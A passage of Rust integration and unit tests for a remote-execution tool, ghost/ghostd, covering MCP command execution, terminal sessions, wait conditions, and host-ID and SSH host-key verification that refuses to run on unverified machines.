    assert!(error.contains("may or may not have changed"), "{error}");
}

/// Much output for `output_file` goes over a connection of its own, and a
/// program that never started answers its failure, with no file.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_mcp_copies_much_output_in_bulk_and_reports_a_failed_start() {
    let daemon = Daemon::start();
    let cwd = daemon.directory.path().to_path_buf();
    let server = mcp_server(&daemon, &cwd);
    let mut session = Session::start(server.clone()).await;
    let result = session
        .call(
            "ghostd_exec",
            json!({
                "target": "local",
                "argv": ["head", "-c", "3000000", "/dev/zero"],
                "output_file": "out",
            }),
        )
        .await;
    assert_eq!(result["exit_code"], 0, "{result}");
    assert_eq!(std::fs::metadata(cwd.join("out")).unwrap().len(), 3_000_000);
    assert_eq!(
        server.pool_of("local").connections(),
        2,
        "the short connection and the bulk one"
    );
    let failed = session
        .call(
            "ghostd_exec",
            json!({
                "target": "local",
                "argv": ["/nonexistent/program"],
                "output_file": "never",
            }),
        )
        .await;
    assert!(failed["failed_to_start"].is_string(), "{failed}");
    assert!(failed["output_file"].is_null(), "{failed}");
    assert!(!cwd.join("never").exists());
}

/// Keys are named as people write them.
#[test]
fn named_keys_parse() {
    use super::sessions::parse_key;
    use ghostd_protocol::v2::NamedKey;
    assert_eq!(parse_key("Enter").unwrap(), NamedKey::Enter);
    assert_eq!(parse_key("enter").unwrap(), NamedKey::Enter);
    assert_eq!(parse_key("Esc").unwrap(), NamedKey::Escape);
    assert_eq!(parse_key("PageDown").unwrap(), NamedKey::PageDown);
    assert_eq!(parse_key("F5").unwrap(), NamedKey::F5);
    assert_eq!(parse_key("F12").unwrap(), NamedKey::F12);
    assert_eq!(parse_key("Ctrl-C").unwrap(), NamedKey::Ctrl('c'));
    assert_eq!(parse_key("ctrl+d").unwrap(), NamedKey::Ctrl('d'));
    assert_eq!(parse_key("^[").unwrap(), NamedKey::Ctrl('['));
    assert_eq!(parse_key("Alt-X").unwrap(), NamedKey::Alt('X'));
    assert_eq!(parse_key("alt-x").unwrap(), NamedKey::Alt('x'));
    for bad in ["", "F13", "Ctrl-1", "Ctrl-ab", "Hyper-x", "Enterr"] {
        assert!(parse_key(bad).is_err(), "{bad:?} parsed");
    }
}

/// `ghost ghostd session send` types its --text and --key in the order
/// the command line gives them.
#[test]
fn session_send_keeps_the_order_of_text_and_keys() {
    use super::sessions::Input;
    use clap::Parser as _;
    let cli = crate::Cli::try_parse_from([
        "ghost", "ghostd", "session", "send", "local", "s1", "--text", "a", "--key", "Enter",
        "--text", "b", "--key", "Ctrl-C",
    ])
    .unwrap();
    let crate::Command::Ghostd {
        command:
            super::GhostdCommand::Session {
                command: super::GhostdSessionCommand::Send(args),
            },
    } = cli.command
    else {
        panic!("not a session send");
    };
    assert_eq!(
        args.input,
        [
            Input::Text("a".to_owned()),
            Input::Key("Enter".to_owned()),
            Input::Text("b".to_owned()),
            Input::Key("Ctrl-C".to_owned()),
        ]
    );
}

/// Which requests are sent again after a lost connection: reads, and
/// starts under their own ID; never what is typed into a session or done
/// to it.
#[test]
fn session_input_is_never_sent_again() {
    use ghostd_protocol::v2::{Condition, Request as V2, SessionSpec, WaitSpec};
    let safe = [
        V2::Identify,
        V2::SessionList,
        V2::MachineState,
        V2::SessionRead {
            session_id: "s".into(),
            wait_ms: 0,
            until: None,
            scrollback_lines: 0,
        },
        V2::SessionLogRead {
            session_id: "s".into(),
            offset: None,
            max_len: 1,
        },
        V2::Wait(WaitSpec::default()),
        V2::SessionStart(SessionSpec {
            session_id: Some("s0123456789abcdef".into()),
            ..SessionSpec::default()
        }),
    ];
    for request in &safe {
        assert!(conn::retry_safe(request), "{request:?}");
    }
    let unsafe_ = [
        V2::SessionStart(SessionSpec::default()),
        V2::SessionSend {
            session_id: "s".into(),
            input: Vec::new(),
        },
        V2::SessionSignal {
            session_id: "s".into(),
            signal: 2,
        },
        V2::SessionResize {
            session_id: "s".into(),
            cols: 80,
            rows: 24,
        },
        V2::SessionClose {
            session_id: "s".into(),
            grace_ms: None,
        },
    ];
    for request in &unsafe_ {
        assert!(!conn::retry_safe(request), "{request:?}");
    }
    // A wait's answer is waited for its timeout and 30 s more.
    let wait = V2::Wait(WaitSpec {
        condition: Condition::FileExists {
            path: b"f".to_vec(),
        },
        timeout_ms: 300_000,
        interval_ms: None,
    });
    assert_eq!(conn::call_timeout(&wait), Some(Duration::from_secs(330)));
    assert_eq!(conn::call_timeout(&V2::Identify), None);
}

/// A wait names exactly one condition, with the parts that go with it.
#[test]
fn wait_conditions_take_one_condition() {
    use super::sessions::ConditionParts;
    use ghostd_protocol::v2::Condition;
    let port = ConditionParts {
        port: Some(8080),
        ..ConditionParts::default()
    };
    assert_eq!(
        port.condition().unwrap(),
        Condition::PortOpen {
            host: None,
            port: 8080
        }
    );
    let two = ConditionParts {
        port: Some(8080),
        file_exists: Some("f".into()),
        ..ConditionParts::default()
    };
    assert!(two.condition().is_err());
    assert!(ConditionParts::default().condition().is_err());
    let https = ConditionParts {
        http: Some("https://example.com/".into()),
        ..ConditionParts::default()
    };
    assert!(https.condition().is_err());
    let no_regex = ConditionParts {
        file_contains: Some("f".into()),
        ..ConditionParts::default()
    };
    assert!(no_regex.condition().is_err());
    let stray = ConditionParts {
        port: Some(1),
        regex: Some("x".into()),
        ..ConditionParts::default()
    };
    assert!(stray.condition().is_err());
}

/// A seed and a cache file in `directory`, and a resolver with them that
/// reaches `daemon` as `local`.
fn local_resolver(directory: &Path, daemon: &Daemon) -> Arc<Resolver> {
    let seed = directory.join("account.seed");
    if !seed.exists() {
        keys::generate_seed(&seed).unwrap();
    }
    Arc::new(
        Resolver::for_tests(
            "http://127.0.0.1:9/",
            Some(seed),
            Some(directory.join("cache").join("ghostd-targets.json")),
        )
        .with_local(daemon.endpoint()),
    )
}

/// An exec that leaves a line in `marker` when it runs.
fn marking(marker: &Path) -> ExecSpec {
    ExecSpec {
        program: argv(&["sh", "-c", &format!("echo run >> '{}'", marker.display())]),
        ..ExecSpec::default()
    }
}

fn lines_in(path: &Path) -> usize {
    std::fs::read_to_string(path).map_or(0, |text| text.lines().count())
}

/// The first contact with `local` learns its host ID; the next pool (the
/// next `ghost x`) names it and runs. A wiped ghostd state (a new host ID)
/// is refused with both IDs and nothing run, until `ghost ghostd forget
/// local` accepts it.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_local_host_id_is_learned_checked_and_forgotten() {
    let daemon = Daemon::start();
    let directory = tempfile::tempdir().unwrap();
    let resolver = local_resolver(directory.path(), &daemon);
    let pool = Pool::new("local", Target::Local, None, Arc::clone(&resolver));
    pool.call(Request::Ping).await.unwrap();
    let learned = resolver.host_id(target::LOCAL_HOST_KEY).expect("learned");
    assert_eq!(learned, daemon.host_id().await);
    assert_eq!(pool.short().await.unwrap().expected_host(), Some(learned));
    assert_eq!(pool.host_check(), Some(true));
    assert_eq!(pool.host_check_note(), None);
    drop(pool);
    let marker = daemon.path("runs");
    let pool = Pool::new("local", Target::Local, None, Arc::clone(&resolver));
    ops::exec(&pool, marking(&marker)).await.unwrap();
    assert_eq!(lines_in(&marker), 1);
    assert_eq!(pool.short().await.unwrap().expected_host(), Some(learned));
    drop(pool);

    daemon.wipe();
    let pool = Pool::new("local", Target::Local, None, Arc::clone(&resolver));
    let refused = ops::exec(&pool, marking(&marker)).await.unwrap_err();
    let fresh = daemon.host_id().await;
    assert_ne!(fresh, learned);
    let message = format!("{refused:#}");
    assert!(message.contains(&learned.to_string()), "{message}");
    assert!(message.contains(&fresh.to_string()), "{message}");
    assert!(message.contains("ghost ghostd forget local"), "{message}");
    assert_eq!(lines_in(&marker), 1, "the refused exec ran");
    // The same pool still refuses.
    assert!(ops::exec(&pool, marking(&marker)).await.is_err());
    assert_eq!(lines_in(&marker), 1);

    let forgotten = resolver.forget_target(&Target::Local).await.unwrap();
    assert_eq!(forgotten.hosts, 1);
    // The pool that refused takes the forget up from the cache, too.
    ops::exec(&pool, marking(&marker)).await.unwrap();
    assert_eq!(lines_in(&marker), 2);
    assert_eq!(resolver.host_id(target::LOCAL_HOST_KEY), Some(fresh));
}

/// An instance that answers another host ID is put to the API: the same
/// instance at the same address learns the new ID, says so and runs the
/// request once; another address is connected to, its ID learned, and the
/// request run there once. A fresh cache entry costs no API request.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_an_instance_s_new_host_id_is_put_to_the_api() {
    let first_daemon = Daemon::start();
    let second_daemon = Daemon::start();
    let directory = tempfile::tempdir().unwrap();
    let seed = directory.path().join("account.seed");
    keys::generate_seed(&seed).unwrap();
    let cache = directory.path().join("cache").join("ghostd-targets.json");
    let web = named("web", "203.0.113.7");
    let moved = {
        let mut moved = named("web", "203.0.113.8");
        moved.instance_id = web.instance_id;
        moved
    };
    let list = |instance: &InstanceView| (200, serde_json::to_string(&[instance]).unwrap());
    let get = |instance: &InstanceView| (200, serde_json::to_string(instance).unwrap());
    let (url, received) = canned_api(vec![
        list(&web),
        get(&web),
        // The first mismatch: the same instance at the same address.
        list(&web),
        get(&web),
        // The second: it moved.
        list(&moved),
        get(&moved),
    ])
    .await;
    let resolver = Arc::new(
        Resolver::for_tests(&url, Some(seed), Some(cache))
            .with_address("203.0.113.7".parse().unwrap(), 22, first_daemon.endpoint())
            .with_address("203.0.113.8".parse().unwrap(), 22, second_daemon.endpoint()),
    );
    let target = Target::Instance(InstanceReference::Name("web".to_owned()));
    let key = target::instance_host_key(web.instance_id, "root");
    let marker = first_daemon.path("runs");
    let pool = Pool::new("web", target.clone(), None, Arc::clone(&resolver));
    ops::exec(&pool, marking(&marker)).await.unwrap();
    assert_eq!(received.lock().unwrap().len(), 2);
    let first_id = first_daemon.host_id().await;
    assert_eq!(resolver.host_id(&key), Some(first_id));
    drop(pool);
    // `ghost x web` again: the name, the address and the host ID from the
    // cache, no API request.
    let pool = Pool::new("web", target.clone(), None, Arc::clone(&resolver));
    ops::exec(&pool, marking(&marker)).await.unwrap();
    assert_eq!(received.lock().unwrap().len(), 2, "the API was asked");
    assert_eq!(lines_in(&marker), 2);
    drop(pool);

    // Reinstalled: a new ghostd state at the same address.
    first_daemon.wipe();
    let pool = Pool::new("web", target.clone(), None, Arc::clone(&resolver));
    let (ran, notices) = conn::collecting(ops::exec(&pool, marking(&marker))).await;
    ran.unwrap();
    assert_eq!(lines_in(&marker), 3, "it ran once");
    assert_eq!(received.lock().unwrap().len(), 4);
    let reinstalled_id = first_daemon.host_id().await;
    assert_ne!(reinstalled_id, first_id);
    assert_eq!(resolver.host_id(&key), Some(reinstalled_id));
    assert_eq!(notices.len(), 1, "{notices:?}");
    assert!(notices[0].contains("new host ID"), "{notices:?}");
    assert!(
        notices[0].contains(&reinstalled_id.to_string()),
        "{notices:?}"
    );

    // Moved: the API has it at another address, whose ghostd runs it.
    first_daemon.wipe();
    let (ran, notices) = conn::collecting(ops::exec(&pool, marking(&marker))).await;
    ran.unwrap();
    assert_eq!(received.lock().unwrap().len(), 6);
    assert_eq!(lines_in(&marker), 4, "it ran once");
    let second_id = second_daemon.host_id().await;
    assert_eq!(resolver.host_id(&key), Some(second_id));
    assert_eq!(pool.short().await.unwrap().expected_host(), Some(second_id));
    assert!(notices[0].contains("moved"), "{notices:?}");
}

/// A mismatch the API cannot explain (it does not answer) runs nothing and
/// forgets nothing: the same pool (an agent trying the tool call again) and
/// the next `ghost x` still expect the host ID ghost knew, ask the API
/// again, and run nothing either.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_a_mismatch_the_api_cannot_explain_runs_nothing_again() {
    let daemon = Daemon::start();
    let directory = tempfile::tempdir().unwrap();
    let seed = directory.path().join("account.seed");
    keys::generate_seed(&seed).unwrap();
    let cache = directory.path().join("cache").join("ghostd-targets.json");
    let web = named("web", "203.0.113.7");
    // The API answers the first lookup only, then refuses connections.
    let (url, received) = canned_api(vec![
        (200, serde_json::to_string(&[&web]).unwrap()),
        (200, serde_json::to_string(&web).unwrap()),
    ])
    .await;
    let resolver = Arc::new(
        Resolver::for_tests(&url, Some(seed), Some(cache)).with_address(
            "203.0.113.7".parse().unwrap(),
            22,
            daemon.endpoint(),
        ),
    );
    let target = Target::Instance(InstanceReference::Name("web".to_owned()));
    let key = target::instance_host_key(web.instance_id, "root");
    let marker = daemon.path("runs");
    let pool = Pool::new("web", target.clone(), None, Arc::clone(&resolver));
    ops::exec(&pool, marking(&marker)).await.unwrap();
    let first_id = daemon.host_id().await;
    assert_eq!(resolver.host_id(&key), Some(first_id));

    daemon.wipe();
    let refused = ops::exec(&pool, marking(&marker)).await.unwrap_err();
    let message = format!("{refused:#}");
    assert!(
        message.contains("looking web up again failed, so nothing was run"),
        "{message}"
    );
    assert_eq!(lines_in(&marker), 1);
    assert!(ops::exec(&pool, marking(&marker)).await.is_err());
    assert_eq!(
        lines_in(&marker),
        1,
        "the retry ran on a machine the API did not vouch for"
    );
    assert_eq!(resolver.host_id(&key), Some(first_id), "the host ID went");
    drop(pool);
    let pool = Pool::new("web", target, None, Arc::clone(&resolver));
    assert!(ops::exec(&pool, marking(&marker)).await.is_err());
    assert_eq!(lines_in(&marker), 1);
    assert_eq!(received.lock().unwrap().len(), 2);
}

/// An instance whose host ID ghost forgot meanwhile (`ghost ghostd forget`,
/// or a rename or delete by another ghost) and that then answers another
/// ID is put to the API, not trusted on first use: the same instance at the
/// same address learns the new ID and runs once; while the API does not
/// answer, nothing runs, also on the call after.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_a_forgotten_instance_s_new_host_id_is_put_to_the_api() {
    let daemon = Daemon::start();
    let directory = tempfile::tempdir().unwrap();
    let seed = directory.path().join("account.seed");
    keys::generate_seed(&seed).unwrap();
    let cache = directory.path().join("cache").join("ghostd-targets.json");
    let web = named("web", "203.0.113.7");
    let list = (200, serde_json::to_string(&[&web]).unwrap());
    let get = (200, serde_json::to_string(&web).unwrap());
    let (url, received) = canned_api(vec![list.clone(), get.clone(), list, get]).await;
    let resolver = Arc::new(
        Resolver::for_tests(&url, Some(seed), Some(cache.clone())).with_address(
            "203.0.113.7".parse().unwrap(),
            22,
            daemon.endpoint(),
        ),
    );
    let target = Target::Instance(InstanceReference::Name("web".to_owned()));
    let key = target::instance_host_key(web.instance_id, "root");
    let marker = daemon.path("runs");
    let pool = Pool::new("web", target, None, Arc::clone(&resolver));
    ops::exec(&pool, marking(&marker)).await.unwrap();
    let first_id = daemon.host_id().await;

    target::forget_instance_in(&cache, web.instance_id);
    daemon.wipe();
    let (ran, notices) = conn::collecting(ops::exec(&pool, marking(&marker))).await;
    ran.unwrap();
    assert_eq!(received.lock().unwrap().len(), 4, "the API was not asked");
    assert_eq!(lines_in(&marker), 2, "it ran once");
    let second_id = daemon.host_id().await;
    assert_ne!(second_id, first_id);
    assert_eq!(resolver.host_id(&key), Some(second_id));
    assert!(
        notices.iter().any(|notice| notice.contains("new host ID")),
        "{notices:?}"
    );

    // Again, and the API no longer answers.
    target::forget_instance_in(&cache, web.instance_id);
    daemon.wipe();
    assert!(ops::exec(&pool, marking(&marker)).await.is_err());
    assert!(ops::exec(&pool, marking(&marker)).await.is_err());
    assert_eq!(lines_in(&marker), 2, "it ran unvouched for");
}

/// Sessions over MCP: a shell started, typed into and read until its
/// answer, Ctrl-C interrupting a program, a start sent again with its ID
/// taking the first session up, and a close. The start sent again here is
/// ghostd's take-up only; ghost's own resend after a lost connection (kill
/// the link during a slow start, then expect one session) is not covered.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_mcp_sessions_type_read_interrupt_and_close() {
    let daemon = Daemon::start();
    let mut session = Session::start(mcp_server(&daemon, daemon.directory.path())).await;
    let started = session
        .call(
            "ghostd_session_start",
            json!({"target": "local", "argv": ["sh"], "cols": 80, "rows": 24, "name": "shell"}),
        )
        .await;
    assert_eq!(started["host_check"], true);
    let id = started["session_id"].as_str().unwrap().to_owned();
    session
        .call(
            "ghostd_session_send",
            json!({"target": "local", "session_id": id, "text": "echo $((40+2))", "keys": ["Enter"]}),
        )
        .await;
    let screen = session
        .call(
            "ghostd_session_read",
            json!({"target": "local", "session_id": id, "until": "matches", "regex": "(?m)^42$", "wait_ms": 10000}),
        )
        .await;
    assert_eq!(screen["until_met"], true, "{screen}");
    assert!(screen["text"].as_str().unwrap().contains("42"));
    assert_eq!(screen["cols"], 80);
    // Ctrl-C stops a sleep; the shell then answers again.
    session
        .call(
            "ghostd_session_send",
            json!({"target": "local", "session_id": id, "text": "sleep 100", "keys": ["Enter"]}),
        )
        .await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    let started_at = Instant::now();
    session
        .call(
            "ghostd_session_send",
            json!({"target": "local", "session_id": id, "keys": ["Ctrl-C"], "text": ""}),
        )
        .await;
    session
        .call(
            "ghostd_session_send",
            json!({"target": "local", "session_id": id, "text": "echo done$((1+1))", "keys": ["Enter"]}),
        )
        .await;
    let screen = session
        .call(
            "ghostd_session_read",
            json!({"target": "local", "session_id": id, "until": "matches", "regex": "(?m)^done2$", "wait_ms": 10000}),
        )
        .await;
    assert_eq!(screen["until_met"], true, "{screen}");
    assert!(started_at.elapsed() < Duration::from_secs(10));
    // A bad key is refused before anything is typed.
    let refused = session
        .call_raw(
            "ghostd_session_send",
            json!({"target": "local", "session_id": id, "keys": ["Hyper-x"]}),
        )
        .await;
    assert_eq!(refused["isError"], true);
    // A start sent again under its ID answers the session it started.
    let again = json!({"target": "local", "argv": ["sh"], "session_id": "s00000000000000aa"});
    let first = session.call("ghostd_session_start", again.clone()).await;
    let second = session.call("ghostd_session_start", again).await;
    assert_eq!(first["session_id"], "s00000000000000aa");
    assert_eq!(second["session_id"], "s00000000000000aa");
    let listed = session
        .call("ghostd_session_list", json!({"target": "local"}))
        .await;
    let sessions = listed["sessions"].as_array().unwrap();
    assert_eq!(sessions.len(), 2, "{listed}");
    let closed = session
        .call(
            "ghostd_session_close",
            json!({"target": "local", "session_id": id}),
        )
        .await;
    assert_ne!(closed["state"], "running", "{closed}");
    let log = session
        .call(
            "ghostd_session_log",
            json!({"target": "local", "session_id": id}),
        )
        .await;
    assert!(log["text"].as_str().unwrap().contains("done2"), "{log}");
    session
        .call(
            "ghostd_session_close",
            json!({"target": "local", "session_id": "s00000000000000aa"}),
        )
        .await;
}

/// Waits over MCP: a port the test opens later and a file it writes later
/// are met; a file that never comes times out; the machine's state has its
/// parts.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_mcp_waits_and_tells_the_machine_s_state() {
    let daemon = Daemon::start();
    let mut session = Session::start(mcp_server(&daemon, daemon.directory.path())).await;
    let port = closed_port();
    let listener = tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(500)).await;
        let listener = tokio::net::TcpListener::bind(("127.0.0.1", port))
            .await
            .unwrap();
        tokio::time::sleep(Duration::from_secs(5)).await;
        drop(listener);
    });
    let waited = session
        .call(
            "ghostd_wait",
            json!({"target": "local", "port": port, "timeout_seconds": 20}),
        )
        .await;
    assert_eq!(waited["met"], true, "{waited}");
    listener.abort();
    let file = daemon.path("later");
    let later = file.clone();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(500)).await;
        std::fs::write(later, "x").unwrap();
    });
    let waited = session
        .call(
            "ghostd_wait",
            json!({"target": "local", "file_exists": file.to_str().unwrap(), "timeout_seconds": 20}),
        )
        .await;
    assert_eq!(waited["met"], true, "{waited}");
    let started = Instant::now();
    let waited = session
        .call(
            "ghostd_wait",
            json!({"target": "local", "file_exists": daemon.path("never").to_str().unwrap(), "timeout_seconds": 1}),
        )
        .await;
    assert_eq!(waited["met"], false, "{waited}");
    assert!(started.elapsed() >= Duration::from_secs(1));
    let two = session
        .call_raw(
            "ghostd_wait",
            json!({"target": "local", "port": 1, "file_exists": "f"}),
        )
        .await;
    assert_eq!(two["isError"], true);
    let state = session
        .call("ghostd_machine_state", json!({"target": "local"}))
        .await;
    assert!(
        state["hostname"]
            .as_str()
            .is_some_and(|name| !name.is_empty())
    );
    assert!(state["cpus"].as_u64().unwrap() > 0);
    assert!(state["memory"]["total_bytes"].as_u64().unwrap() > 0);
    assert!(state["disks"].is_array());
    assert!(state["listening"].is_array());
    assert!(state["load"].as_array().is_some_and(|load| load.len() == 3));
    assert_eq!(state["host_check"], true);
}

/// A version 1 ghostd (0.1.1, `GHOSTD_V1_BIN`) still runs programs, with
/// `host_check: false` and the hint to update it; a session needs 0.2.0.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_version_1_runs_without_a_host_check() {
    let Some(program) = std::env::var_os("GHOSTD_V1_BIN").map(PathBuf::from) else {
        eprintln!("skipped: GHOSTD_V1_BIN names no ghostd 0.1.1");
        return;
    };
    let daemon = Daemon::of(program);
    let mut session = Session::start(mcp_server(&daemon, daemon.directory.path())).await;
    let result = session
        .call_raw(
            "ghostd_exec",
            json!({"target": "local", "argv": ["echo", "hi"]}),
        )
        .await;
    assert_ne!(result["isError"], true, "{result}");
    let output = &result["structuredContent"];
    assert_eq!(output["stdout"], "hi\n");
    assert_eq!(output["host_check"], false);
    let notice = output["notice"].as_str().unwrap();
    assert!(
        notice.contains("ghostd on local is 0.1.1: update it (ghost ghostd install local) to check the machine's identity"),
        "{notice}"
    );
    assert!(
        result["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("update it")
    );
    let status = session
        .call("ghostd_status", json!({"target": "local"}))
        .await;
    assert_eq!(status["host_check"], false);
    assert_eq!(status["protocol_version"], 1);
    assert!(status["host_check_note"].as_str().is_some());
    assert!(status["host_id"].is_null());
    let refused = session
        .call_raw(
            "ghostd_session_start",
            json!({"target": "local", "argv": ["sh"]}),
        )
        .await;
    assert_eq!(refused["isError"], true);
    let text = refused["content"][0]["text"].as_str().unwrap();
    assert!(text.contains("needs ghostd 0.2.0"), "{text}");
    let refused = session
        .call_raw("ghostd_machine_state", json!({"target": "local"}))
        .await;
    assert_eq!(refused["isError"], true);
}

/// A target ghost knows a host ID of that now answers as ghostd 0.1.1,
/// which cannot say one, is likely another machine: `local` is refused
/// until `ghost ghostd forget local`, and an instance is put to the API,
/// which has it at the same address, so it runs unchecked and says so.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_version_1_where_a_host_id_is_known_is_refused_or_put_to_the_api() {
    let Some(program) = std::env::var_os("GHOSTD_V1_BIN").map(PathBuf::from) else {
        eprintln!("skipped: GHOSTD_V1_BIN names no ghostd 0.1.1");
        return;
    };
    let daemon = Daemon::of(program);
    let directory = tempfile::tempdir().unwrap();
    let resolver = local_resolver(directory.path(), &daemon);
    let known = ghostd_protocol::v2::HostId([9; 16]);
    assert!(resolver.store_host_id(target::LOCAL_HOST_KEY, known));
    let marker = daemon.path("runs");
    let pool = Pool::new("local", Target::Local, None, Arc::clone(&resolver));
    let refused = ops::exec(&pool, marking(&marker)).await.unwrap_err();
    let message = format!("{refused:#}");
    assert!(message.contains(&known.to_string()), "{message}");
    assert!(message.contains("ghost ghostd forget local"), "{message}");
    assert!(message.contains("ghost ghostd install local"), "{message}");
    assert_eq!(lines_in(&marker), 0, "the refused exec ran");
    resolver.forget_target(&Target::Local).await.unwrap();
    ops::exec(&pool, marking(&marker)).await.unwrap();
    assert_eq!(lines_in(&marker), 1);
    assert_eq!(pool.host_check(), Some(false));
    drop(pool);

    let web = named("web", "203.0.113.7");
    let list = (200, serde_json::to_string(&[&web]).unwrap());
    let get = (200, serde_json::to_string(&web).unwrap());
    let (url, received) = canned_api(vec![
        list.clone(),
        get.clone(),
        list.clone(),
        get.clone(),
        list,
        get,
    ])
    .await;
    let resolver = Arc::new(
        Resolver::for_tests(
            &url,
            Some(directory.path().join("account.seed")),
            Some(directory.path().join("cache").join("ghostd-targets.json")),
        )
        .with_address("203.0.113.7".parse().unwrap(), 22, daemon.endpoint()),
    );
    let key = target::instance_host_key(web.instance_id, "root");
    assert!(resolver.store_host_id(&key, known));
    let target = Target::Instance(InstanceReference::Name("web".to_owned()));
    let pool = Pool::new("web", target.clone(), None, Arc::clone(&resolver));
    let (ran, notices) = conn::collecting(ops::exec(&pool, marking(&marker))).await;
    ran.unwrap();
    assert_eq!(lines_in(&marker), 2);
    assert_eq!(received.lock().unwrap().len(), 4, "the API was not asked");
    assert!(
        notices
            .iter()
            .any(|notice| notice.contains("cannot say its host ID")),
        "{notices:?}"
    );
    assert_eq!(resolver.host_id(&key), None);
    drop(pool);
    // The next `ghost x web` runs unchecked, at the address the API gives:
    // without a host ID, a cached address is not used unasked.
    let pool = Pool::new("web", target, None, Arc::clone(&resolver));
    let (ran, notices) = conn::collecting(ops::exec(&pool, marking(&marker))).await;
    ran.unwrap();
    assert_eq!(lines_in(&marker), 3);
    assert_eq!(received.lock().unwrap().len(), 6);
    assert!(notices.is_empty(), "{notices:?}");
    assert_eq!(pool.host_check(), Some(false));
}

/// An instance's SSH files its host key under the instance's own name in
/// ghost's file; an `ssh://` target keeps SSH's way.
#[test]
fn an_instance_files_its_host_key_per_instance() {
    let id = Uuid::from_u128(7);
    let instance = Endpoint::Ssh {
        host: "203.0.113.7".to_owned(),
        port: Some(1000),
        user: Some("root".to_owned()),
        control_path: None,
        host_keys: Some(HostKeys {
            alias: instance_alias(id),
            known_hosts: Some(PathBuf::from("/data/ghost/known_hosts")),
        }),
    };
    let argv: Vec<String> = instance
        .ssh_prefix()
        .into_iter()
        .map(|arg| arg.into_string().unwrap())
        .collect();
    for option in [
        format!("HostKeyAlias=ghost-instance-{id}"),
        "UserKnownHostsFile=/data/ghost/known_hosts".to_owned(),
        "HashKnownHosts=no".to_owned(),
        "StrictHostKeyChecking=accept-new".to_owned(),
    ] {
        assert!(
            argv.windows(2).any(|pair| pair == ["-o", &option]),
            "{option}"
        );
    }
    let plain = Endpoint::Ssh {
        host: "203.0.113.7".to_owned(),
        port: Some(22),
        user: None,
        control_path: None,
        host_keys: None,
    };
    let argv: Vec<String> = plain
        .ssh_prefix()
        .into_iter()
        .map(|arg| arg.into_string().unwrap())
        .collect();
    assert!(!argv.iter().any(|arg| arg.starts_with("HostKeyAlias")));
    assert!(!argv.iter().any(|arg| arg.starts_with("UserKnownHostsFile")));
    // The change survives dropping the multiplexing.
    assert_eq!(instance.without_mux(), instance);
}

/// Forgetting an instance removes its lines, and only its lines.
#[test]
fn forgetting_an_instance_removes_its_host_key_lines() {
    use std::os::unix::fs::PermissionsExt as _;
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("known_hosts");
    let one = instance_alias(Uuid::from_u128(1));
    let two = instance_alias(Uuid::from_u128(2));
    std::fs::write(
        &path,
        format!(
            "{one} ssh-ed25519 AAAA1\n{one} ssh-rsa AAAA2\n{two} ssh-ed25519 AAAA3\n[h]:22 ssh-ed25519 AAAA4\n"
        ),
    )
    .unwrap();
    assert_eq!(remove_known_host(&path, &one), 2);
    assert_eq!(
        std::fs::read_to_string(&path).unwrap(),
        format!("{two} ssh-ed25519 AAAA3\n[h]:22 ssh-ed25519 AAAA4\n")
    );
    assert_eq!(remove_known_host(&path, &one), 0);
    assert_eq!(remove_known_host(&directory.path().join("none"), &one), 0);
    assert_eq!(
        std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
        0o600
    );
}

/// The known hosts file is created 0600 in a 0700 directory.
#[test]
fn the_known_hosts_file_is_private() {
    use std::os::unix::fs::PermissionsExt as _;
    let directory = tempfile::tempdir().unwrap();
    let path = known_hosts_file_in(directory.path()).unwrap();
    assert_eq!(path, directory.path().join("ghost/known_hosts"));
    let mode =
        |path: &std::path::Path| std::fs::metadata(path).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode(&path), 0o600);
    assert_eq!(mode(path.parent().unwrap()), 0o700);
}

/// A rescue's host key is filed in advance under the rescue's alias, beside the instance's own,
/// which stays; a new rescue's key replaces the line, and the end removes it. The SSH command
/// checks it strictly, at the instance's address or its shared IP's port.
#[test]
fn a_rescues_host_key_is_filed_in_advance_and_checked() {
    let directory = tempfile::tempdir().unwrap();
    let mut instance = instance_fixture();
    instance.public_ipv4 = Some("203.0.113.7".to_owned());
    let id = instance.instance_id;
    let own = instance_alias(id);
    let path = known_hosts_file_in(directory.path()).unwrap();
    std::fs::write(&path, format!("{own} ssh-ed25519 AAAAown\n")).unwrap();
    let filed =
        target::remember_rescue_host_key_in(directory.path(), id, "ssh-ed25519 AAAAfirst").unwrap();
    assert_eq!(filed, path);
    let rescue = target::rescue_alias(id);
    assert_eq!(rescue, format!("ghost-rescue-{id}"));
    assert_eq!(
        std::fs::read_to_string(&path).unwrap(),
        format!("{own} ssh-ed25519 AAAAown\n{rescue} ssh-ed25519 AAAAfirst\n")
    );
    // Filed again, nothing changes; a new rescue's key replaces it.
    target::remember_rescue_host_key_in(directory.path(), id, "ssh-ed25519 AAAAfirst").unwrap();
    target::remember_rescue_host_key_in(directory.path(), id, "ssh-ed25519 AAAAsecond").unwrap();
    assert_eq!(
        std::fs::read_to_string(&path).unwrap(),
        format!("{own} ssh-ed25519 AAAAown\n{rescue} ssh-ed25519 AAAAsecond\n")
    );
    for bad in [
        "",
        "ssh-ed25519",
        "ssh-ed25519 AAAA extra",
        "ssh-ed25519 AA\nAA",
        "rsa AAAA",
    ] {
        assert!(
            target::remember_rescue_host_key_in(directory.path(), id, bad).is_err(),
            "{bad:?}"
        );
    }
    assert_eq!(
        target::rescue_ssh_command(&instance, &path).unwrap(),
        format!(
